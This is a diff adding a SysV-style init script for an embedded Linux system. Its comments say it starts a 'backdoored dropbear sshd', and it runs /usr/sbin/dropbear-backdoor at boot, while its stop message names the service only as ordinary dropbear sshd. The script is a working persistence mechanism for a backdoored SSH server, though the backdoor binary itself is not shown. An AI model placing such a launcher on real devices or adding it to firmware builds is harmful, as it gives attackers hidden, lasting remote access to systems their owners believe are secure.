@@ -1,0 +1,45 @@
+#!/bin/sh
+#
+# Starts backdoored dropbear sshd.
+#
+
+DROPBEAR_ARGS="$DROPBEAR_ARGS -R"
+
+start() {
+	# /etc/dropbear will be a symlink to RW /var/run/dropbear.
+	# Make sure that this directory exists.
+	mkdir -p /var/run/dropbear
+
+	printf "Starting backdoored dropbear sshd: "
+	umask 077
+
+	start-stop-daemon -S -q -p /var/run/dropbear.pid \
+		--exec /usr/sbin/dropbear-backdoor -- $DROPBEAR_ARGS
+	[ $? = 0 ] && echo "OK" || echo "FAIL"
+}
+stop() {
+	printf "Stopping dropbear sshd: "
+	start-stop-daemon -K -q -p /var/run/dropbear.pid
+	[ $? = 0 ] && echo "OK" || echo "FAIL"
+}
+restart() {
+	stop
+	start
+}
+
+case "$1" in
+  start)
+  	start
+	;;
+  stop)
+  	stop
+	;;
+  restart|reload)
+  	restart
+	;;
+  *)
+	echo "Usage: $0 {start|stop|restart}"
+	exit 1
+esac
+
+exit $?
